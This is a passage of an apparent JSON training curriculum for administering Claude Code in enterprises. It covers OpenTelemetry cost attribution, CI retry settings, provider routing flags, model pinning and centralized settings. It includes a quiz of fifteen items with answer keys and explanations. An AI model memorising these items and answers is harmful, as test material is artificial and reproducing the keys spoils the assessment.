    "instructions": "This task sets up custom dimensions so metrics can be sliced by team or cost center in your OTel backend.\n\n1. Open your managed settings file:\n```bash\nnano ~/.claude/settings.json\n```\n\n2. Add `OTEL_RESOURCE_ATTRIBUTES` to the `env` block (adjust values to match your team):\n```json\n{\n  \"env\": {\n    \"CLAUDE_CODE_ENABLE_TELEMETRY\": \"1\",\n    \"OTEL_METRICS_EXPORTER\": \"otlp\",\n    \"OTEL_EXPORTER_OTLP_ENDPOINT\": \"http://localhost:4318\",\n    \"OTEL_RESOURCE_ATTRIBUTES\": \"department=engineering,team.id=platform,cost_center=eng-123\"\n  }\n}\n```\n\n3. Generate a session to emit labeled metrics:\n```bash\nclaude -p \"List three sorting algorithms.\"\n```\n\n4. Query Prometheus to confirm the custom label is attached to the cost metric:\n```bash\ncurl -s 'http://localhost:9090/api/v1/query?query=claude_code_cost_usage_total' | python3 -c \"\nimport sys, json\ndata = json.load(sys.stdin)\nfor r in data.get('data', {}).get('result', []):\n    print(r.get('metric', {}))\n\"\n```\n\nYou should see `department`, `team_id`, and `cost_center` labels in the metric output.\n\n5. To reduce per-datapoint cardinality while keeping team-level slicing, add:\n```json\n\"OTEL_METRICS_INCLUDE_RESOURCE_ATTRIBUTES\": \"false\"\n```\nThis moves the custom attrs to the OTLP resource block only (not per-datapoint labels). Re-run the query to confirm the labels no longer appear per-datapoint.",
    "doneWhen": "The Prometheus label query shows your custom department, team.id, and cost_center attributes attached to claude_code_cost_usage_total metric results."
   },
   {
    "id": "stage-10-task-ci-watchdog",
    "afterSectionIdx": 8,
    "title": "Configure retry resilience for a CI pipeline Claude Code job",
    "instructions": "This task hardens a headless Claude Code invocation against API capacity errors.\n\n1. Create a test CI wrapper script at `/tmp/cc-ci-wrapper.sh`:\n```bash\ncat > /tmp/cc-ci-wrapper.sh << 'EOF'\n#!/usr/bin/env bash\nset -euo pipefail\n\n# Retry indefinitely on 429/529 capacity errors (do NOT raise MAX_RETRIES instead)\nexport CLAUDE_CODE_RETRY_WATCHDOG=1\n\n# Keep MAX_RETRIES at default (10) or lower for fast failure on non-capacity errors\nexport CLAUDE_CODE_MAX_RETRIES=10\n\n# Extend per-request timeout for slow CI networks (default 600000ms = 10min)\nexport API_TIMEOUT_MS=900000\n\necho \"Starting Claude Code CI job with watchdog retry enabled...\"\nclaude -p \"$1\"\nEOF\nchmod +x /tmp/cc-ci-wrapper.sh\n```\n\n2. Test the wrapper runs a headless prompt successfully:\n```bash\n/tmp/cc-ci-wrapper.sh \"Output only the word DONE.\"\n```\n\n3. Verify the retry cap behavior: confirm that MAX_RETRIES=25 is clamped to 15 by checking the Claude Code source or docs. In your settings, never set it above 15 — use WATCHDOG instead for indefinite capacity retry.\n\n4. For a real CI integration (GitHub Actions example), add to your workflow `.github/workflows/claude-review.yml`:\n```yaml\n- name: Claude Code review\n  env:\n    ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}\n    CLAUDE_CODE_RETRY_WATCHDOG: \"1\"\n    CLAUDE_CODE_MAX_RETRIES: \"10\"\n    API_TIMEOUT_MS: \"900000\"\n  run: |\n    claude -p \"Review the diff and output a brief summary.\"\n```",
    "doneWhen": "Running `/tmp/cc-ci-wrapper.sh 'Output only the word DONE.'` completes successfully and prints DONE, confirming the watchdog-enabled wrapper executes headless Claude Code sessions correctly."
   }
  ],
  "visualizations": [
   {
    "id": "stage-10-v",
    "kind": "comparison-table",
    "title": "Monitoring, analytics & troubleshooting",
    "textualSummary": "Key concepts of Monitoring, analytics & troubleshooting: Adoption & ROI analytics dashboards, GitHub contribution attribution, OpenTelemetry cost & usage export.",
    "columns": [
     "Concept",
     "In this stage"
    ],
    "rows": [
     {
      "label": "Adoption & ROI analytics dashboards",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "GitHub contribution attribution",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "OpenTelemetry cost & usage export",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "Multi-team cost attribution",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     }
    ]
   }
  ],
  "confusions": [
   {
    "misconception": "Skipping Monitoring, analytics & troubleshooting.",
    "correction": "Each stage is load-bearing for the setup."
   },
   {
    "misconception": "These concepts are interchangeable.",
    "correction": "Each has a distinct role; see the definitions."
   }
  ],
  "quiz": [
   {
    "id": "stage-10-q1",
    "type": "multiple-choice",
    "prompt": "Your team has GitHub analytics enabled and the dashboard is completely empty after two days. A teammate says the toggle must be misconfigured. What is the most likely actual cause?",
    "options": [
     "The GitHub analytics toggle was enabled before the Claude GitHub app was installed",
     "The plan does not support GitHub analytics — it requires Enterprise only",
     "Contribution data always takes at least a week to appear for new setups",
     "The Owner role was not used to enable the analytics toggle"
    ],
    "correct": 0,
    "explanation": "The content states that 'An empty dashboard usually means the GitHub app isn't installed yet.' The setup must be sequenced: GitHub admin installs the app first, then a Claude Owner enables analytics and the GitHub toggle. If the app was never installed, no data flows regardless of toggle state. Option B is wrong — Teams plans are supported, not just Enterprise. Option C is wrong — the content says data typically appears within 24 hours, sometimes 'a few days,' not a week. Option D is wrong — the Owner role IS required for the toggle, but the question states analytics is 'enabled' meaning that step succeeded; the empty dashboard points to the missing app installation."
   },
   {
    "id": "stage-10-q2",
    "type": "multiple-choice",
    "prompt": "A developer rewrote 25% of a Claude-suggested function before merging the PR. Will those lines appear in the 'Lines of code with CC' metric?",
    "options": [
     "No — code rewritten more than 20% by the developer is not credited to Claude Code",
     "Yes — any PR merged within the attribution window counts all lines regardless of edits",
     "Yes — only the original Claude-suggested lines are counted, not the rewritten portion",
     "No — the PR falls outside the 21-day attribution window because of the rewrite time"
    ],
    "correct": 0,
    "explanation": "The content states explicitly: 'Code rewritten >20% by the developer is not credited to Claude Code.' A 25% rewrite exceeds this threshold, so those lines are excluded. Option B is wrong — the attribution window determines whether a session is matched to a PR, but rewrite percentage is a separate exclusion criterion applied on top. Option C is a plausible partial-credit intuition but the rule is a binary threshold on the whole block, not a partial deduction. Option D conflates rewrite time with the PR merge attribution window, which is a separate concept entirely."
   },
   {
    "id": "stage-10-q3",
    "type": "multiple-choice",
    "prompt": "Your team uses Bedrock to access Claude Code. After enabling OpenTelemetry, you notice that user.email is blank for every event. A teammate says this is a Bedrock configuration error you can fix in the console. What is actually happening?",
    "options": [
     "On Bedrock there is no Claude account identity, so only user.id and session.id populate; you must inject user identity yourself via OTEL_RESOURCE_ATTRIBUTES",
     "The OTEL_LOG_USER_PROMPTS flag must be set to 1 to surface user email in events",
     "user.email only populates after the user has authenticated with GitHub for contribution metrics",
     "The Bedrock IAM role lacks the permissions needed to pass user identity to the OTel exporter"
    ],
    "correct": 0,
    "explanation": "The content states: 'On Bedrock/Vertex/Foundry/direct-API there is no Claude account identity (only user.id and session.id populate) — inject enduser.id=jdoe@example.com yourself via OTEL_RESOURCE_ATTRIBUTES, or events can't map to real users.' This is a structural limitation of non-OAuth deployments, not a misconfiguration. Option B is wrong — OTEL_LOG_USER_PROMPTS logs prompt content, not user identity. Option C confuses GitHub OAuth for contribution metrics with the OTel user.email attribute, which comes from Claude account OAuth. Option D is wrong — IAM permissions govern API access, not OTel attribute population."
   },
   {
    "id": "stage-10-q4",
    "type": "multiple-choice",
    "prompt": "An SRE sets CLAUDE_CODE_MAX_RETRIES=20 for a long-running CI job to avoid transient 429 failures. What actually happens?",
    "options": [
     "The value is clamped to 15 — values above the cap are silently reduced to the maximum allowed",
     "The setting is rejected and the default of 10 is used instead",
     "The CI job will retry up to 20 times, but only for 5xx errors, not 429s",
     "The setting works as intended; there is no upper cap on CLAUDE_CODE_MAX_RETRIES"
    ],
    "correct": 0,
    "explanation": "The content states MAX_RETRIES is 'Capped at 15 (values above clamped).' Setting it to 20 silently results in 15 retries. The content also recommends CLAUDE_CODE_RETRY_WATCHDOG=1 for unattended/CI sessions that need to handle capacity errors indefinitely, rather than raising MAX_RETRIES. Option B is wrong — the value is clamped, not rejected. Option C is wrong — 429 throttles are explicitly listed among retry-eligible errors. Option D is wrong — the cap exists and the content is explicit about it."
   },
   {
    "id": "stage-10-q5",
    "type": "multiple-choice",
    "prompt": "You want to find every PR in your GitHub org that was Claude-assisted, outside of the analytics dashboard. What approach does the content recommend?",
    "options": [
     "Search GitHub for the 'claude-code-assisted' label, which is applied to merged PRs with Claude-assisted lines",
     "Query the OpenTelemetry pull_request.count metric, which includes PR URLs as attributes",
     "Export the dashboard CSV and cross-reference with your GitHub PR list",
     "Use the GitHub REST API to query Claude Code's internal PR tracking database"
    ],
    "correct": 0,
    "explanation": "The content states: 'Merged PRs with Claude-assisted lines are labeled claude-code-assisted in GitHub — query adoption programmatically by searching GitHub for that label rather than relying only on the dashboard.' This is the recommended programmatic approach. Option B is wrong — the OTel metric counts PRs but does not include PR URLs or enough metadata to enumerate specific PRs. Option C works only for the top 10 users unless you use 'Export all users,' and still requires a manual cross-reference — it is not the recommended programmatic approach. Option D is a fabrication; no such internal database is mentioned."
   },
   {
    "id": "stage-10-q6",
    "type": "multiple-choice",
    "prompt": "A security engineer wants to capture the exact Bash commands Claude Code ran during a session for SIEM analysis. Which configuration is required?",
    "options": [
     "Enable OTEL_LOG_TOOL_DETAILS=1 along with the OTLP logs exporter, which captures Bash commands and call arguments on tool_result events",
     "Set OTEL_LOG_RAW_API_BODIES=1, which includes Bash commands in the full Messages API JSON",
     "Enable OTEL_LOG_TOOL_CONTENT=1, which is the only flag that captures tool input in span events",
     "Bash commands are captured automatically by the audit log without any additional flags"
    ],
    "correct": 0,
    "explanation": "The content states: 'Enable the OTLP logs exporter and OTEL_LOG_TOOL_DETAILS=1 to capture MCP server/tool names, Bash commands, and call arguments on tool_result, tool_decision, mcp_server_connection events.' This is the correct combination for SIEM Bash command capture. Option B is wrong — OTEL_LOG_RAW_API_BODIES captures full Messages API JSON including conversation history, which is broader than needed and may include sensitive content; it is not the targeted mechanism for tool/Bash command logging. Option C is wrong — OTEL_LOG_TOOL_CONTENT captures tool input/output in span events and requires tracing to be enabled; OTEL_LOG_TOOL_DETAILS is the flag for Bash commands in log events. Option D is wrong — the audit event list (tool_decision, permission_mode_changed, etc.) does not include Bash command arguments without OTEL_LOG_TOOL_DETAILS."
   },
   {
    "id": "stage-10-q7",
    "type": "multiple-choice",
    "prompt": "You configure OTEL_METRIC_EXPORT_INTERVAL=1000 (1 second) to debug a flaky metric. The issue is resolved. What should you do and why?",
    "options": [
     "Reset the interval back to the default 60000ms — leaving 1-second debug intervals in production floods the exporter",
     "Leave it at 1 second to get the most granular production data possible",
     "Change it to 5000ms to match the logs and traces intervals, which are production defaults",
     "Remove the variable entirely so it inherits from the OTel Collector's configured scrape interval"
    ],
    "correct": 0,
    "explanation": "The content explicitly warns: 'Only lower [export intervals] for debugging, then reset' and 'Leaving 1s debug intervals in production floods the exporter.' The default metric export interval is 60000ms (60 seconds). Option B ignores the explicit warning about flooding. Option C is wrong — 5000ms is the default for logs and traces, not metrics; using it for metrics still floods the exporter relative to the intended 60-second cadence. Option D is wrong — the variable controls how often the client-side SDK batches and pushes metrics, not how often a Prometheus scraper pulls; removing it returns to the 60-second default, which is correct, but the reasoning about inheriting from the Collector is wrong."
   },
   {
    "id": "stage-10-q8",
    "type": "multi-select",
    "prompt": "Which of the following files or directories are AUTO-EXCLUDED from the 'Lines of code with CC' metric? Select all that apply.",
    "options": [
     "package-lock.json",
     "dist/ build artifacts",
     "Unit test files (e.g., foo.test.ts)",
     "Test fixture snapshots and mock data",
     "Lines longer than 1,000 characters"
    ],
    "correct": [
     0,
     1,
     3,
     4
    ],
    "explanation": "The content lists auto-excluded files as: 'lock files (package-lock.json, yarn.lock, Cargo.lock), generated/minified/protobuf code, build dirs (dist/, build/, node_modules/, target/), test fixtures (snapshots, cassettes, mock data), and any line >1,000 chars.' So package-lock.json (lock file), dist/ (build dir), test fixture snapshots/mock data, and lines >1000 chars are all excluded. Unit test files themselves (e.g., foo.test.ts) are NOT listed as auto-excluded — only test fixtures (snapshots, cassettes, mock data) are excluded. This is a critical distinction: the test code you write is counted; the snapshot/cassette/mock data files are not."
   },
   {
    "id": "stage-10-q9",
    "type": "multi-select",
    "prompt": "A teammate wants to attribute OTel cost metrics to specific teams and cost centers across a fleet deployment. Which approaches does the content support? Select all that apply.",
    "options": [
     "Set OTEL_RESOURCE_ATTRIBUTES per group in managed settings or a launch wrapper with values like department=engineering,team.id=platform",
     "Use the user.email attribute, which is automatically populated on all deployment types including Bedrock",
     "Set OTEL_RESOURCE_ATTRIBUTES=enduser.id=jdoe@example.com on Bedrock deployments where no Claude account identity exists",
     "Query the Console analytics dashboard's per-user cost column filtered by team",
     "Use the skill.name, plugin.name, and agent.name attributes on cost.usage and token.usage metrics to attribute spend to components"
    ],
    "correct": [
     0,
     2,
     4
    ],
    "explanation": "Option A is correct: the content explicitly describes setting OTEL_RESOURCE_ATTRIBUTES per group (managed settings or launch wrapper) with department/team/cost_center values to slice dashboards. Option C is correct: for Bedrock where no Claude account identity exists, the content recommends injecting enduser.id via OTEL_RESOURCE_ATTRIBUTES. Option E is correct: the content states 'attribute spend to skills/plugins/subagents via skill.name, plugin.name, agent.name on cost.usage/token.usage.' Option B is wrong — user.email only populates for OAuth users; on Bedrock/Vertex/direct-API it is absent. Option D is wrong — the dashboard does NOT surface per-user token counts and cost estimates; the content explicitly states 'the dashboard does NOT surface them — configure OpenTelemetry export.'"
   },
   {
    "id": "stage-10-q10",
    "type": "multiple-choice",
    "prompt": "An OTel query shows claude_code.api_error firing once for a request. Does this mean Claude Code retried the request once before giving up?",
    "options": [
     "No — api_error fires only after retries are exhausted; intermediate retries are not separate events. The attempt attribute shows how many retries occurred.",
     "Yes — each api_error event corresponds to one retry attempt, so one event means one retry",
     "No — api_error fires on the first failure; subsequent retries fire api_retry events instead",
     "It depends on whether CLAUDE_CODE_MAX_RETRIES was set above 1 for this session"
    ],
    "correct": 0,
    "explanation": "The content states: 'claude_code.api_error fires only after retries are exhausted (terminal); intermediate retries are not separate events — count retries via the attempt attribute.' So one api_error event means the entire retry sequence failed, not that one retry occurred. Option B has the relationship backwards — the event is terminal, not per-attempt. Option C invents an api_retry event that is not mentioned in the content. Option D is wrong — the semantics of api_error are fixed (terminal, post-exhaustion) regardless of the retry limit setting."
   },
   {
    "id": "stage-10-q11",
    "type": "multiple-choice",
    "prompt": "You want to see a complete per-user breakdown of activity, not just the top performers. Where do you get this data?",
    "options": [
     "Use 'Export all users' in the Console team insights dashboard to get a full per-user CSV",
     "The Leaderboard view shows all users, not just the top 10",
     "Run a query against the OpenTelemetry metrics using user.account_uuid to enumerate all users",
     "The Admin analytics page at claude.ai/analytics/claude-code shows all users in a paginated table"
    ],
    "correct": 0,
    "explanation": "The content states: 'Leaderboard shows top 10 users; use Export all users for a complete per-user CSV (all users, not just top 10).' The Export all users feature is the correct mechanism for complete data. Option B is directly contradicted by the content — the Leaderboard shows only top 10. Option C is technically possible via OTel but is not the recommended or described approach for this use case; the content describes Export all users for this purpose. Option D is wrong — the Admin analytics page is for admins/owners to view aggregate metrics, not a paginated per-user table."
   },
   {
    "id": "stage-10-q12",
    "type": "multiple-choice",
    "prompt": "A long-running overnight agent job is failing on 529 'Server is temporarily limiting requests' errors after 10 retries. A teammate suggests setting MAX_RETRIES=50. What does the content recommend instead, and why?",
    "options": [
     "Set CLAUDE_CODE_RETRY_WATCHDOG=1, which makes unattended sessions retry 429/529 capacity errors indefinitely instead of failing — this is preferred over raising MAX_RETRIES for long runs",
     "Set MAX_RETRIES=15, which is the effective maximum; 529 errors will then be retried up to 15 times",
     "Add a cron job that restarts the agent on failure, since no in-process retry mechanism handles 529s indefinitely",
     "529 errors count against quota and will block retries regardless of MAX_RETRIES; contact Anthropic support"
    ],
    "correct": 0,
    "explanation": "The content states: 'CLAUDE_CODE_RETRY_WATCHDOG | unset | =1 makes unattended/CI sessions retry 429/529 capacity errors indefinitely instead of failing — prefer this over raising MAX_RETRIES for long runs.' This is the explicit recommendation for this exact scenario. Option B is wrong — MAX_RETRIES is capped at 15, so even the suggested 50 only gives 15 retries, which isn't indefinite. The watchdog is the right tool for indefinite retry on capacity errors. Option C invents an external workaround when a built-in mechanism exists. Option D is directly contradicted by the content: '529 Overloaded / Server is temporarily limiting requests do not count against quota.'"
   },
   {
    "id": "stage-10-q13",
    "type": "multiple-choice",
    "prompt": "You use the /usage command in session. A teammate says /cost and /stats still work. What relationship do these commands have?",
    "options": [
     "/usage subsumes /cost and /stats — the old names route to the right tab in /usage, so all three effectively work",
     "/cost and /stats are deprecated and will error; only /usage is supported",
     "/usage, /cost, and /stats are completely independent commands with different data sources",
     "/cost works for subscription users; /usage is for API key users; /stats is for Enterprise only"
    ],
    "correct": 0,
    "explanation": "The content states: '/usage (subsumes /cost and /stats; old names route to the right tab).' The old command names still work as aliases that route to the appropriate tab within /usage. Option B is wrong — they still work as aliases, they don't error. Option C is wrong — they share the same underlying system, with /cost and /stats routing into /usage. Option D invents a user-tier distinction that the content does not describe."
   },
   {
    "id": "stage-10-q14",
    "type": "multi-select",
    "prompt": "Which of the following are among the audit events that Claude Code emits to the OTLP logs exporter? Select all that apply.",
    "options": [
     "tool_decision",
     "permission_mode_changed",
     "mcp_server_connection",
     "api_request",
     "plugin_installed"
    ],
    "correct": [
     0,
     1,
     2,
     4
    ],
    "explanation": "The content lists audit events as: 'tool_decision, permission_mode_changed, hook_execution_complete, auth, mcp_server_connection, plugin_installed/plugin_loaded, tool_result.' So tool_decision, permission_mode_changed, mcp_server_connection, and plugin_installed are all audit events. api_request is NOT listed as an audit event — it is a separate event type used for correlation (the content mentions using prompt.id to correlate api_request/tool_result events, but api_request itself is not in the audit event list)."
   },
   {
    "id": "stage-10-q15",
    "type": "multiple-choice",
    "prompt": "A manager sees the 'Lines of code with CC' metric is low for the past sprint and concludes the team barely used Claude Code. What does the content say about interpreting this reading?",
    "options": [
     "Treat reported numbers as a deliberate underestimate — only high-confidence attributions count, so low numbers should not be read as low usage",
     "The metric is accurate for all usage; low numbers indicate the team did not use Claude Code for code generation",
     "Low numbers typically indicate the GitHub app attribution window is misconfigured",
     "The metric only counts accepted suggestions, so low numbers mean the team rejected most Claude suggestions"
    ],
    "correct": 0,
    "explanation": "The content explicitly states: 'Treat reported numbers as a deliberate underestimate — only high-confidence attributions count. Don't read low numbers as low usage.' The metric has multiple exclusions (rewrites >20%, lock files, build dirs, lines >1000 chars, etc.) that intentionally omit uncertain attributions. Option B is the exact misconception the content warns against. Option C invents a specific diagnosis not supported by the content. Option D partially describes 'Lines of code accepted' (which excludes rejected suggestions) but the question is about overall line counts and the general underestimate principle."
   }
  ],
  "masteryCheckpoint": "You can explain the concepts of Monitoring, analytics & troubleshooting."
 },
 {
  "id": "stage-11",
  "stage": 11,
  "title": "Enterprise providers & gateways",
  "summary": "Enterprise providers & gateways: Model pinning, Small/fast model cost trap, Provider enable & routing precedence.",
  "prerequisites": [
   "stage-10"
  ],
  "objectives": [
   "Understand the concepts in Enterprise providers & gateways."
  ],
  "definitions": [
   {
    "term": "Model pinning",
    "short": "Explicitly setting each model-tier env var to a concrete model ID/deployment so the team runs a known version instead of a drifting built-in alias default."
   },
   {
    "term": "Small/fast model cost trap",
    "short": "If the background/small-fast model isn't pinned to a real Haiku deployment, it silently defaults to the PRIMARY model, so cheap tasks run at primary rates."
   },
   {
    "term": "Provider enable & routing precedence",
    "short": "Which enterprise backend a request hits is decided by env-var flags with a fixed precedence order, so leftover flags silently route to the wrong provider."
   },
   {
    "term": "Centralized config distribution",
    "short": "Pushing provider/model/auth config through the settings.json env block or enterprise managed settings rather than per-developer shell exports, treating keys as production credentials."
   },
   {
    "term": "Provider auth & credential refresh",
    "short": "Each backend authenticates via its cloud SDK's credential chain, with settings hooks that re-run or export credentials when they expire mid-session."
   },
   {
    "term": "Region & project resolution order",
    "short": "Region (and GCP project) are resolved through a precedence chain of env vars, profiles, and config files, so a stale value silently targets the wrong region/account."
   }
  ],
  "sections": [
   {
    "heading": "What This Stage Covers",
    "body": "Configuring provider routing in Claude Code is the kind of task that looks trivial from the docs but silently misbehaves in practice. You set an env var, it works on your machine, you roll it out, and half the team is hitting Sonnet at Opus rates because one flag was missing. This stage covers the exact mechanics of provider selection and model pinning, the cost trap that bites every Bedrock/Vertex deployment, how to distribute config without per-developer shell exports, credential refresh hooks, region/project resolution order, model access provisioning, and the LLM gateway contract a proxy must satisfy to work correctly with Claude Code."
   },
   {
    "heading": "Provider Enable & Routing Precedence",
    "body": "Claude Code routes requests to exactly one backend per session, determined by boolean enable flags. Setting the wrong flag, or leaving a stale flag from a previous experiment, silently routes to the wrong provider with no error.\n\nThe provider flags are:\n\n```bash\nCLAUDE_CODE_USE_BEDROCK=1         # Amazon Bedrock Invoke API\nCLAUDE_CODE_USE_MANTLE=1          # Amazon Bedrock Mantle endpoint (Anthropic API shape over AWS creds)\nCLAUDE_CODE_USE_VERTEX=1          # Google Vertex AI\nCLAUDE_CODE_USE_FOUNDRY=1         # Microsoft Foundry\nCLAUDE_CODE_USE_ANTHROPIC_AWS=1   # Claude Platform on AWS\n```\n\nWhen multiple flags are set, the key interaction is Bedrock + Mantle together: model IDs in the Mantle format (`anthropic.*`) route to the Mantle endpoint, all other model IDs route to the Bedrock Invoke API. The `/status` command inside an active Claude Code session confirms the active provider: it shows `Amazon Bedrock (Mantle)` when Mantle is active alone, and `Amazon Bedrock + Amazon Bedrock (Mantle)` when both are active together. This is the canonical check — do not rely on env var inspection alone.\n\n### The Stale-Flag Problem\n\nIf a developer tested Bedrock and left `CLAUDE_CODE_USE_BEDROCK=1` in their shell profile, and the project then rotates to Vertex, they will silently hit Bedrock after the migration. The fix is centralized config (see the later section on the `env` block) so flags are committed to settings files rather than inherited from shell exports.\n\n### Auth bypass flags for gateway routing\n\nWhen routing through a gateway that injects credentials server-side, Claude Code's client-side authentication must be disabled to avoid double-signing requests:\n\n```bash\nCLAUDE_CODE_SKIP_BEDROCK_AUTH=1       # Skip SigV4 for Bedrock pass-through\nCLAUDE_CODE_SKIP_VERTEX_AUTH=1        # Skip ADC for Vertex pass-through\nCLAUDE_CODE_SKIP_ANTHROPIC_AWS_AUTH=1 # Skip auth for Claude Platform on AWS pass-through\nCLAUDE_CODE_SKIP_MANTLE_AUTH=1        # Skip client auth for Mantle pass-through\nCLAUDE_CODE_SKIP_FOUNDRY_AUTH=1       # Skip Azure auth for Foundry pass-through\n```\n\nNever set these against a directly-connected provider endpoint."
   },
   {
    "heading": "Model Pinning: How Aliases Resolve and Why They Drift",
    "body": "Claude Code exposes alias names like `sonnet`, `opus`, and `haiku` that map to concrete model IDs. On the Anthropic API, `opus` resolves to Opus 4.8 and `sonnet` resolves to Sonnet 4.6. On third-party providers (Bedrock, Vertex, Foundry), aliases resolve to a **built-in default** baked into the Claude Code binary — a value that lags behind Anthropic's newest releases and may not yet be enabled in your account.\n\n### Alias defaults by provider (without pinning)\n\n| Provider | `opus` resolves to | `sonnet` resolves to | Small/fast (Haiku) default |\n|---|---|---|---|\n| Anthropic API | Opus 4.8 | Sonnet 4.6 | Haiku class |\n| Bedrock | Opus 4.6 | `us.anthropic.claude-sonnet-4-5-20250929-v1:0` | **Same as primary** |\n| Vertex AI | Opus 4.6 | `claude-sonnet-4-5@20250929` | **Same as primary** |\n| Foundry | Opus 4.6 | Sonnet 4.5 | **Same as primary** |\n\nThe Bedrock and Vertex default for the small/fast model (Haiku class, used for background tasks like title generation) is the **primary model** because Haiku may not be enabled in every account or region. This is the cost trap described in the next section.\n\n### Pinning with environment variables\n\nThe canonical pinning variables are:\n\n```bash\n# Bedrock — use cross-region inference profile IDs\nexport ANTHROPIC_DEFAULT_OPUS_MODEL='us.anthropic.claude-opus-4-8'\nexport ANTHROPIC_DEFAULT_SONNET_MODEL='us.anthropic.claude-sonnet-4-6'\nexport ANTHROPIC_DEFAULT_HAIKU_MODEL='us.anthropic.claude-haiku-4-5-20251001-v1:0'\n\n# Vertex AI — use Vertex version names\nexport ANTHROPIC_DEFAULT_OPUS_MODEL='claude-opus-4-8'\nexport ANTHROPIC_DEFAULT_SONNET_MODEL='claude-sonnet-4-6'\nexport ANTHROPIC_DEFAULT_HAIKU_MODEL='claude-haiku-4-5@20251001'\n```\n\nNote: `ANTHROPIC_SMALL_FAST_MODEL` is **deprecated** — use `ANTHROPIC_DEFAULT_HAIKU_MODEL` instead.\n\nThe same pattern applies for `ANTHROPIC_DEFAULT_FABLE_MODEL` when deploying Fable 5 on a third-party provider.\n\n### Per-version overrides with `modelOverrides`\n\nThe `ANTHROPIC_DEFAULT_*_MODEL` variables configure one model ID per family alias. When you need to expose several versions of the same family in the `/model` picker — each routed to its own application inference profile ARN — use `modelOverrides` in your settings file:\n\n```json\n{\n  \"modelOverrides\": {\n    \"claude-opus-4-7\": \"arn:aws:bedrock:us-east-2:123456789012:application-inference-profile/opus-47-prod\",\n    \"claude-opus-4-6\": \"arn:aws:bedrock:us-east-2:123456789012:application-inference-profile/opus-46-prod\",\n    \"claude-sonnet-4-6\": \"arn:aws:bedrock:us-east-2:123456789012:application-inference-profile/sonnet-46-prod\"\n  }\n}\n```\n\nKeys must be Anthropic model IDs exactly as listed in the Models overview, including the date suffix for dated forms. Unknown keys are silently ignored. Values passed directly via `ANTHROPIC_MODEL`, `--model`, or `ANTHROPIC_DEFAULT_*_MODEL` env vars are sent to the provider as-is and are **not** transformed by `modelOverrides`.\n\n### Capability declarations for provider-specific IDs\n\nBedrock ARNs and Foundry deployment names don't match Claude Code's built-in detection patterns, so features like effort levels and extended thinking may be silently disabled. Declare them explicitly:\n\n```bash\nexport ANTHROPIC_DEFAULT_OPUS_MODEL='arn:aws:bedrock:us-east-1:123456789012:application-inference-profile/opus-prod'\nexport ANTHROPIC_DEFAULT_OPUS_MODEL_NAME='Opus 4.8 (Bedrock)'\nexport ANTHROPIC_DEFAULT_OPUS_MODEL_SUPPORTED_CAPABILITIES='effort,xhigh_effort,max_effort,thinking,adaptive_thinking,interleaved_thinking'\n```\n\nThe same `_NAME`, `_DESCRIPTION`, and `_SUPPORTED_CAPABILITIES` suffixes work for `ANTHROPIC_DEFAULT_SONNET_MODEL`, `ANTHROPIC_DEFAULT_HAIKU_MODEL`, `ANTHROPIC_DEFAULT_FABLE_MODEL`, and `ANTHROPIC_CUSTOM_MODEL_OPTION`."
   },
   {
    "heading": "The Small/Fast Model Cost Trap",
    "body": "This is the highest-impact misconfiguration on Bedrock and Vertex deployments. On both providers, when `ANTHROPIC_DEFAULT_HAIKU_MODEL` is not set, the small/fast model (used for background token usage — session title generation, auto-compact, and similar lightweight tasks) defaults to **the same model as the primary**.\n\nThe consequence: every background task runs at your primary model's per-token rate. On Bedrock, Sonnet 4.x is roughly an order of magnitude more expensive per token than Haiku 4.5. Multiply that across background operations for a team and the overspend is significant and invisible — it appears in your AWS cost report as Sonnet invocations you didn't author.\n\n### Why the default is this way\n\nThis is an intentional conservative default, not a bug. Haiku access is not guaranteed in every Bedrock account or Vertex project. If Claude Code defaulted to Haiku without it being provisioned, every session would fail on background tasks. The current default (primary model) ensures sessions work; it just costs more than necessary.\n\n### The fix\n\nPin Haiku explicitly once you've verified it is enabled in your account:\n\n```bash\n# Bedrock\nexport ANTHROPIC_DEFAULT_HAIKU_MODEL='us.anthropic.claude-haiku-4-5-20251001-v1:0'\n\n# Vertex AI\nexport ANTHROPIC_DEFAULT_HAIKU_MODEL='claude-haiku-4-5@20251001'\n```\n\nVerify by starting a new session and watching for a title to be generated. Background title-generation calls are short (small prompt, small completion) and should route to Haiku class, not Sonnet. Query your Bedrock or GCP cost dashboard filtered by model ID: if you see Sonnet invocations with very short completions and zero user-visible output, you are in the trap.\n\n### The `ANTHROPIC_MODEL` trap\n\nSetting only `ANTHROPIC_MODEL` (the primary model override) does not affect the small/fast model. `ANTHROPIC_MODEL` controls what you see in the session; `ANTHROPIC_DEFAULT_HAIKU_MODEL` controls the background tier. Both must be set.\n\n### The Haiku region override\n\nIf your Haiku model needs to invoke in a different AWS region than your primary:\n\n```bash\nexport ANTHROPIC_SMALL_FAST_MODEL_AWS_REGION=us-west-2\n```\n\nThis has no effect unless `ANTHROPIC_DEFAULT_HAIKU_MODEL` is also set."
   },
   {
    "heading": "Centralized Config Distribution via the `env` Block",
    "body": "Per-developer shell exports are a liability: they differ across machines, they don't survive shell reconfigurations, they leak into child processes, and there is no canonical record of what the team is running. The right model for enterprise deployment is the settings file `env` block.\n\nThe `env` key in any settings file injects environment variables into every Claude Code session that loads that file, before Claude Code reads its own env vars. This means you can distribute provider flags, model pins, and region config through the same git-committed or MDM-deployed settings files that control permissions and policies.\n\n### Settings file anatomy for provider config\n\n```json\n{\n  \"env\": {\n    \"CLAUDE_CODE_USE_BEDROCK\": \"1\",\n    \"AWS_REGION\": \"us-east-1\",\n    \"AWS_PROFILE\": \"claude-code-prod\",\n    \"ANTHROPIC_DEFAULT_SONNET_MODEL\": \"us.anthropic.claude-sonnet-4-6\",\n    \"ANTHROPIC_DEFAULT_HAIKU_MODEL\": \"us.anthropic.claude-haiku-4-5-20251001-v1:0\",\n    \"ANTHROPIC_DEFAULT_OPUS_MODEL\": \"us.anthropic.claude-opus-4-8\"\n  },\n  \"awsAuthRefresh\": \"aws sso login --profile claude-code-prod\",\n  \"model\": \"sonnet\",\n  \"availableModels\": [\"sonnet\", \"haiku\"],\n  \"enforceAvailableModels\": true\n}\n```\n\n### Where to put what: committed-vs-personal comparison\n\n| Setting | Committed project 